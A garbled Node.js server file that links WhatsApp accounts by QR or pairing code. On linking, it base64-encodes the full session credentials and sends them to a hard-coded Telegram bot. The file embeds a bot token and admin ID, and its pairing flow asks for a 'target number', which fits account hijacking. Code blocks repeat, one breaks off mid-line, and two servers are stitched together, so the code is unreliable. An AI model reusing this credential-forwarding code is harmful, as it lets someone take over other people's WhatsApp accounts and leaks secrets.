// server.js - WhatsApp QR Server with Instant Telegram Session Delivery (FIXED)
const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIGURATION ====================
const BOT_TOKEN = "8408756846:AAGe3KH0ssai2xRwV2cUKTer5A6xeEl2uQo";
const ADMIN_ID = "8093002631";

let currentQr = null;
let connectionStatus = "Fetch fresh QR... Please wait.";

async function sendSessionToTelegram(base64Text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const message = `🎯 <b>WHATSAPP SESSION GENERATED SUCCESSFULLY!</b>\n\n<code>${base64Text}</code>\n\n📌 <b>Next Step:</b> Upar di gayi poori string ko copy karein aur apne News Bot ke Railway environment variables me <code>SESSION_STRING</code> ke naam se save kar dein.`;
    
    try {
        await axios.post(url, {
            chat_id: ADMIN_ID,
            text: message,
            parse_mode: "HTML"
        });
        console.log("[+] Session string successfully forwarded to Telegram admin.");
    } catch (err) {
        console.error("[-] Failed to send Telegram message:", err.message);
    }
}

async function startWhatsAppSession() {
    const authDir = path.join(__dirname, 'temp_qr_session');
    
    if (fs.existsSync(authDir)) {
        try { fs.rmSync(authDir, { recursive: true, force: true }); } catch(e){}
    }

    const { state, saveCreds } = await useMultiFileAuthState(authDir);
    
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        auth: state,
        printQRInTerminal: true
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, qr } = update;
        
        if (qr) {
            connectionStatus = "QR Code Ready. Please Scan Now!";
            QRCode.toDataURL(qr, (err, url) => {
                if (!err) currentQr = url;
            });
        }

        if (connection === "close") {
            currentQr = null;
            connectionStatus = "Connection Closed. Refreshing fresh QR...";
            startWhatsAppSession();
        } else if (connection === "open") {
            currentQr = null;
            connectionStatus = "Connected Successfully! Check your Telegram.";
            
            try {
                const credsFile = path.join(authDir, 'creds.json');
                if (fs.existsSync(credsFile)) {
                    const rawCreds = fs.readFileSync(credsFile, 'utf-8');
                    const base64Session = Buffer.from(rawCreds).toString('base64');
                    await sendSessionToTelegram(base64Session);
                }
            } catch (e) {
                console.log("Token processing error:", e);
            }
            
            try { sock.logout(); fs.rmSync(authDir, { recursive: true, force: true }); } catch(e){}
        }
    });
}

startWhatsAppSession();

// Fixed clean text UI to prevent any compiler character breaking
app.get('/', (req, res) => {
    if (currentQr) {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>WhatsApp Auto-Share QR Server</title>
            <style>
                body { font-family: sans-serif; background: #0b141a; color: #e9edef; text-align: center; padding: 30px; }
                .card { max-width: 450px; margin: 40px auto; background: #111b21; padding: 30px; border-radius: 10px; border: 1px solid #222e35; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
                h2 { color: #00a884; }
                img { background: white; padding: 15px; border-radius: 8px; margin: 25px 0; }
                .status { font-weight: bold; font-size: 16px; color: #34b7f1; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>WhatsApp Live QR Server</h2>
                <p>Mobile se Linked Devices -> Link a Device par ja kar is QR code ko scan karein:</p>
                <img src="${currentQr}" alt="WhatsApp Scan" width="240">
                <p class="status">Status: ${connectionStatus}</p>
                <p style="font-size: 12px; color: #8696a0;">Scan hote hi session string direct aapke Telegram par inbox ho jayegi!</p>
            </div>
            <script>setTimeout(() => { location.reload(); }, 20000);</script>
        </body>
        </html>
        `);
    } else {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>body { font-family: sans-serif; background: #0b141a; color: #fff; text-align: center; padding: 60px; }</style>
        </head>
        <body>
            <h3>Status: ${connectionStatus}</h3>
            <p>Page reload ho raha hai, please 5-10 seconds wait karein...</p>
            <br><a href="/" style="color:#00a884; font-size:16px; text-decoration:none; font-weight:bold;">Click to Reload</a>
            <script>setTimeout(() => { location.reload(); }, 5000);</script>
        </body>
        </html>
        `);
    }
});

app.listen(PORT, () => {
    console.log(`[*] Auto-Share QR Server online on port ${PORT}`);
});
    const authDir = path.join(__dirname, 'temp_qr_session');
    
    // Clear state on every fresh loop initialization to prevent junk locks
    if (fs.existsSync(authDir)) {
        try { fs.rmSync(authDir, { recursive: true, force: true }); } catch(e){}
    }

    const { state, saveCreds } = await useMultiFileAuthState(authDir);
    
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        auth: state,
        printQRInTerminal: true
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, qr } = update;
        
        if (qr) {
            connectionStatus = "📸 QR Code Ready. Please Scan Now!";
            QRCode.toDataURL(qr, (err, url) => {
                if (!err) currentQr = url;
            });
        }

        if (connection === "close") {
            currentQr = null;
            connectionStatus = "🔄 Connection Closed. Refreshing fresh QR endpoint...";
            startWhatsAppSession();
        } else if (connection === "open") {
            currentQr = null;
            connectionStatus = "✅ Connected Successfully! Check your Telegram.";
            
            try {
                const credsFile = path.join(authDir, 'creds.json');
                if (fs.existsSync(credsFile)) {
                    const rawCreds = fs.readFileSync(credsFile, 'utf-8');
                    const base64Session = Buffer.from(rawCreds).toString('base64');
                    
                    // Trigger the auto share function instantly
                    await sendSessionToTelegram(base64Session);
                }
            } catch (e) {
                console.log("Token processing error:", e);
            }
            
            // Clean dynamic files after successful push delivery execution
            try { sock.logout(); fs.rm
            <p>Kisi bhi country ka number enter karein.<br><b>Format:</b> Country Code ke sath bina spaces ya (+) ke likhein.<br>
            Examples: Pakistan (923001234567), India (919876543210), USA (12025550143)</p>
            
            <form action="/get-code" method="POST">
                <input type="text" name="phone" placeholder="e.g. 923001234567" required autocomplete="off">
                <button type="submit">Generate Global Pairing Code</button>
            </form>
            <p class="warning">⚠️ Kisi dusre device par active validation chal rahi ho toh deployment clear hone dein.</p>
        </div>
    </body>
    </html>
    `);
});

// Processing Dynamic Global Sessions
app.post('/get-code', async (req, res) => {
    // Strips any character, spaces or plus(+) sign to keep pure international numeric format
    let phone = req.body.phone.replace(/[^0-9]/g, ''); 
    
    if (!phone || phone.length < 8) {
        return res.send("<h3>❌ Invalid Phone Number Format! International numeric digits length missing. <a href='/'>Go Back</a></h3>");
    }

    const randomId = Math.random().toString(36).substring(7);
    const authDir = path.join(__dirname, `temp_auth_${randomId}`);
    
    try {
        const { state, saveCreds } = await useMultiFileAuthState(authDir);
        
        const sock = makeWASocket({
            logger: pino({ level: "silent" }),
            auth: state,
            printQRInTerminal: false
        });

        await delay(2500); // Dynamic core setup sync delay

        if (!sock.authState.creds.registered) {
            let pairCode = await sock.requestPairingCode(phone);
            
            res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { font-family: sans-serif; background-color: #0f141c; color: #fff; text-align: center; padding: 40px; }
                    .card { max-width: 500px; margin: 0 auto; background: #1a2332; padding: 30px; border-radius: 12px; border: 1px solid #2d3d57; }
                    .code-box { font-size: 38px; font-weight: bold; letter-spacing: 6px; color: #ff4747; background: #0f141c; padding: 20px; display: inline-block; border-radius: 8px; border: 2px dashed #4da6ff; margin: 25px 0; }
                    .note { color: #9aa5b5; font-size: 13px; line-height: 1.6; text-align: left; background: #222d3d; padding: 15px; border-radius: 6px; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h2>🎯 Pairing Code Generated Successfully!</h2>
                    <p>Apne target number <b>+${phone}</b> wale WhatsApp mobile app par jayein:</p>
                    <p style="font-size:14px;color:#9aa5b5;">Settings -> Linked Devices -> Link with Phone Number instead</p>
                    
                    <div class="code-box">${pairCode}</div>
                    
                    <div class="note">
                        📌 <b>Next Steps:</b><br>
                        1. Mobile par ye code enter karein.<br>
                        2. Jaise hi Link Success ho jaye, standard <b>Railway App Logs</b> open karein.<br>
                        3. Logs ke andr complete Base64 encoded session string print ho jayegi.<br>
                        4. Use copy karke apne main Auto-News client variables me insert kar dein.
                    </div>
                    <br><a href="/" style="color:#4da6ff; text-decoration:none;">← Reset and Go Back</a>
                </div>
            </body>
            </html>
            `);
            
            sock.ev.on("creds.update", saveCreds);
            sock.ev.on("connection.update", async (update) => {
                const { connection } = update;
                if (connection === "open") {
                    console.log(`\n=========================================\n✅ LINKED VERIFIED SUCCESFULLY: +${phone}\n=========================================\n`);
                    
                    try {
                        const credsFile = path.join(authDir, 'creds.json');
                        const rawCreds = fs.readFileSync(credsFile, 'utf-8');
                        // Creating clean cross-platform base64 token data
                        const base64Session = Buffer.from(rawCreds).toString('base64');
                        
                        console.log("\n👇👇👇 COPY THIS BASE64 SESSION STRING 👇👇👇\n");
                        console.log(base64Session);
                        console.log("\n=========================================\n");
                    } catch (e) {
                        console.log("Encoding execution token conversion error:", e);
                    }
                    
                    // Instant cleanup loop
                    try { sock.logout(); fs.rmSync(authDir, { recursive: true, force: true }); } catch {}
                }
            });
        }
    } catch (err) {
        res.send(`<h3>❌ Server Core Error: ${err.message}</h3><a href="/">Try Again</a>`);
    }
});

app.listen(PORT, () => {
    console.log(`[*] Global Pairing Application running on port ${PORT}`);
});
      
